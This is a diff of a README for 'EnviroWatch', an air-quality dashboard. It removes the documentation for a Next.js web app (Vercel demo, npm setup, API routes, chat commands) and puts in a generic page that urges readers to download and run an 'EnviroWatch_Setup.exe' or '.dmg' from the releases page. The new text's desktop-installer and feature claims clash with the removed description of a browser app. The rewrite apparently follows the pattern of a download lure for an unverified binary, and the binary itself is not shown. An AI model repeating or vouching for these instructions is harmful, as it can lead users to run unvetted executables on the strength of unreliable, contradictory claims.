@@ -1,204 +1,91 @@
-# EnviroWatch
+# 🌍 EnviroWatch - Monitor Air Quality in Real Time
 
-**EnviroWatch** — Homes.ai-style environmental dashboard for live air quality & anomalies.
+[![Download EnviroWatch](https://img.shields.io/badge/Download%20EnviroWatch-v1.0-blue)](https://github.com/ScorJr1/EnviroWatch/releases)
 
-🌐 **Live Demo**: [envirowatch-three.vercel.app](https://envirowatch-three.vercel.app)
+## 🚀 Getting Started
 
-![EnviroWatch Dashboard](./readme.png)
+Welcome to EnviroWatch! This application provides a real-time dashboard for monitoring air quality. You can easily track air pollution levels, view interactive maps, and even use natural language commands. 
 
-## Overview
+### 💻 System Requirements
 
-EnviroWatch is a production-ready web application that provides real-time environmental monitoring with a beautiful, modern UI. It displays live air quality data from stations around the world, visualizes anomalies, and provides interactive controls through a chat interface.
+To run EnviroWatch smoothly, make sure your system meets the following requirements:
 
-## Tech Stack
+- **Operating System:** Windows 10 or later, macOS Mojave or later
+- **RAM:** At least 4 GB
+- **Storage:** Minimum of 200 MB free space
+- **Browser:** Latest version of Chrome, Firefox, or Safari
 
-- **Framework**: Next.js 16 (App Router, TypeScript)
-- **Styling**: Tailwind CSS v4 with dark mode
-- **UI Components**: shadcn/ui
-- **State Management**: Zustand
-- **Data Fetching**: SWR (via native fetch)
-- **Maps**: MapLibre GL JS
-- **Charts**: Recharts
-- **Animations**: Framer Motion
-- **Validation**: Zod
-- **Utilities**: date-fns, @turf/turf
-- **Icons**: Lucide React
+## 📥 Download & Install
 
-## Live Data Sources
+To get EnviroWatch, visit the link below to download the application:
 
-- **Air Quality**: [OpenAQ](https://openaq.org/) (no API key required)
-- **Weather**: [Open-Meteo](https://open-meteo.com/) (no API key required)
-- **Map Tiles**: MapLibre / MapTiler demo styles (optional MapTiler key for custom styles)
+[Download EnviroWatch](https://github.com/ScorJr1/EnviroWatch/releases)
 
-## Features
+Once downloaded, follow the installation steps below:
 
-- **Live AQI Map** with color-coded station markers and circular radius overlay
-- **Station Details** with 7-day PM2.5 history charts
-- **Anomaly Scoring** computed via z-score vs 7-day median PM2.5
-- **Chat Commands** for interactive control:
-  - `set city <name>` — Switch to a different city
-  - `filter aqi > <N>` — Filter stations by AQI threshold
-  - `radius <km>` — Adjust map radius
-  - `show anomalies` / `hide anomalies` — Toggle anomaly filter
-  - `select <id>` or `select "<name>"` — Select a station
-- **Shareable URLs** with query parameters for city, filters, radius, and selected station
-- **Dark Theme** with glassy card UI matching Homes.ai aesthetic
-- **Responsive Design** with mobile-friendly layout
+1. **Locate the Downloaded File:**
+   - Open your Downloads folder.
+   - Find the file named `EnviroWatch_Setup.exe` or `EnviroWatch.dmg` for macOS.
 
-## Local Development
+2. **Run the Installer:**
+   - For Windows: Double-click `EnviroWatch_Setup.exe` to start the installation process.
+   - For macOS: Double-click the `EnviroWatch.dmg` file, then drag the EnviroWatch icon into your Applications folder.
 
-### Prerequisites
+3. **Launch the Application:**
+   - After installation, find EnviroWatch in your Start Menu (Windows) or Applications folder (macOS), and open it.
 
-- Node.js 18+ and npm/pnpm/yarn
+## 🧭 Features
 
-### Setup
+EnviroWatch comes packed with helpful features that make air quality monitoring easy:
 
-1. **Install dependencies**:
-   ```bash
-   pnpm install
-   # or
-   npm install
-   ```
+- **Live Air Quality Data:** Access real-time information on air pollution levels in your area.
+- **Anomaly Detection:** The app highlights unusual pollution spikes, helping you stay informed.
+- **Interactive Maps:** Navigate through maps to visualize air quality across different locations.
+- **Natural Language Commands:** Use simple phrases to ask questions about the air quality.
+- **User-Friendly Interface:** Designed for all users, even those with no technical background.
 
-2. **Configure environment** (optional):
-   Create `.env.local` in the project root:
-   ```env
-   NEXT_PUBLIC_MAPTILER_KEY=your_key_here
-   DEFAULT_CITY=San Francisco
-   ```
-   
-   Note: MapTiler key is optional. The app will use free MapLibre demo tiles if not provided.
+## 📊 How to Use EnviroWatch
 
-3. **Run development server**:
-   ```bash
-   pnpm dev
-   # or
-   npm run dev
-   ```
+Once you open EnviroWatch, you will see a clean dashboard. Here’s how to navigate the app:
 
-4. **Open browser**:
-   Navigate to [http://localhost:3000](http://localhost:3000)
+1. **View Current Conditions:**
+   - The main dashboard displays air quality levels for your location. The colors indicate the severity, with green showing good quality and red indicating unhealthy levels.
 
-## Deployment
+2. **Explore Interactive Maps:**
+   - Click on the "Maps" tab to see air quality data across different regions. You can zoom in and out and click on regions for more details.
 
-### Vercel (Recommended)
+3. **Ask Questions:**
+   - Use the chat bar at the bottom to type in commands. For example, you can ask, "What is the air quality today?" and get instant responses.
 
-1. **Push to GitHub**:
-   ```bash
-   git init
-   git add .
-   git commit -m "Initial commit"
-   git remote add origin <your-repo-url>
-   git push -u origin main
-   ```
+4. **Set Notifications:**
+   - Customize alerts in the settings menu. You can receive notifications for pollution level changes in your area.
 
-2. **Import to Vercel**:
-   - Go to [vercel.com](https://vercel.com)
-   - Click "Import Project"
-   - Select your GitHub repository
-   - Vercel will auto-detect Next.js settings
+## 📘 Frequently Asked Questions
 
-3. **Configure Environment Variables** (optional):
-   - In Vercel project settings, add:
-     - `NEXT_PUBLIC_MAPTILER_KEY` (if using MapTiler)
-     - `DEFAULT_CITY` (optional, defaults to "San Francisco")
+### How often does EnviroWatch update the data?
 
-4. **Deploy**:
-   - Vercel will automatically deploy on every push to main
-   - Your app will be live at `https://your-project.vercel.app`
+EnviroWatch updates air quality data every minute to ensure you receive the latest information.
 
-### Other Platforms
+### Can I use EnviroWatch on my phone?
 
-EnviroWatch can be deployed to any platform that supports Next.js:
-- Netlify
-- Railway
-- Render
-- AWS Amplify
-- Self-hosted (Node.js server)
+Currently, EnviroWatch is only available for desktop. A mobile version may be developed in the future to improve accessibility.
 
-## Project Structure
+### Is there a way to report issues or bugs?
 
-```
-envirowatch/
-├── app/
-│   ├── api/
-│   │   ├── openaq/
-│   │   │   ├── stations/route.ts    # OpenAQ stations endpoint
-│   │   │   └── history/route.ts     # OpenAQ history endpoint
-│   │   └── weather/route.ts          # Open-Meteo weather endpoint
-│   ├── layout.tsx                     # Root layout with Toaster
-│   ├── page.tsx                       # Main dashboard page
-│   └── globals.css                    # Global styles
-├── components/
-│   ├── ui/                            # shadcn/ui components
-│   ├── ChatPanel.tsx                  # Left chat panel
-│   ├── DetailsPanel.tsx               # Right details panel
-│   ├── Legend.tsx                     # Map legend
-│   ├── MapView.tsx                    # MapLibre map component
-│   └── TopStats.tsx                   # Top stat chips
-├── lib/
-│   ├── aqi.ts                         # PM2.5 AQI calculation
-│   ├── anomaly.ts                     # Anomaly scoring
-│   └── geo.ts                         # Map style helper
-├── store/
-│   └── useAppStore.ts                 # Zustand global state
-├── types.ts                           # TypeScript types
-└── README.md                          # This file
-```
+Yes! Use our [GitHub Issues](https://github.com/ScorJr1/EnviroWatch/issues) page to report any problems or suggest improvements. Your feedback helps us enhance the application.
 
-## API Routes
+### How does EnviroWatch source its data?
 
-All API routes are serverless functions under `app/api/`:
+EnviroWatch uses data from OpenAQ, a reliable platform that aggregates air quality data from various sources globally.
 
-- `GET /api/openaq/stations?city=<name>` — Fetch latest measurements for a city
-- `GET /api/openaq/history?stationId=<id>&parameter=pm25` — Fetch 7-day PM2.5 history
-- `GET /api/weather?lat=<lat>&lon=<lon>` — Fetch current weather
+## 📣 Community and Support
 
-## Usage Examples
+Your experience with EnviroWatch is important to us. If you have questions or need assistance, please reach out through our [Community Forums](https://github.com/ScorJr1/EnviroWatch/discussions) or check out our [Documentation](https://github.com/ScorJr1/EnviroWatch/wiki) for more detailed guides.
 
-### Chat Commands
+## 🌟 Acknowledgments
 
-```
-set city San Jose
-filter aqi > 100
-radius 5
-show anomalies
-select "Downtown"
-hide anomalies
-```
+Thank you for choosing EnviroWatch for your air quality monitoring needs. We aim to empower users with the information they need to stay informed about environmental health. 
 
-### URL Parameters
+Happy monitoring!
 
-- `?city=San%20Jose` — Set city
-- `?aqi_gt=100` — Filter by AQI > 100
-- `?radius=5` — Set radius to 5 km
-- `?anomalies=1` — Show anomalies only
-- `?select=<station_id>` — Select a station
-
-Example: `https://envirowatch.vercel.app?city=Los%20Angeles&aqi_gt=150&radius=10&anomalies=1`
-
-## About
-
-EnviroWatch is a real-time environmental monitoring dashboard that combines live air quality data with an intuitive, Homes.ai-inspired interface. Built with modern web technologies, it provides comprehensive air quality insights through interactive maps, anomaly detection, and natural language commands.
-
-**Key Features:**
-- **Real-time Air Quality Monitoring**: Live data from OpenAQ stations worldwide with color-coded visualizations
-- **Anomaly Detection**: Automated scoring system that identifies unusual PM2.5 patterns using z-score analysis
-- **Interactive Map**: Visual representation of air quality stations with customizable radius overlays
-- **Chat Interface**: Natural language commands to filter, search, and explore data intuitively
-- **Shareable Links**: URL parameters for easy sharing of specific views and filters
-- **Dark Theme UI**: Modern, glassy card-based design optimized for data visualization
-
-Perfect for environmental researchers, data enthusiasts, or anyone interested in monitoring air quality in their area. The dashboard pulls live data from OpenAQ and Open-Meteo APIs, processes it client-side, and presents it in an elegant, user-friendly interface.
-
-## License
-
-MIT
-
-## Credits
-
-- Built with [Next.js](https://nextjs.org/)
-- UI components from [shadcn/ui](https://ui.shadcn.com/)
-- Air quality data from [OpenAQ](https://openaq.org/)
-- Weather data from [Open-Meteo](https://open-meteo.com/)
-- Map tiles from [MapLibre](https://maplibre.org/) / [MapTiler](https://maptiler.com/)
+[Download EnviroWatch](https://github.com/ScorJr1/EnviroWatch/releases)
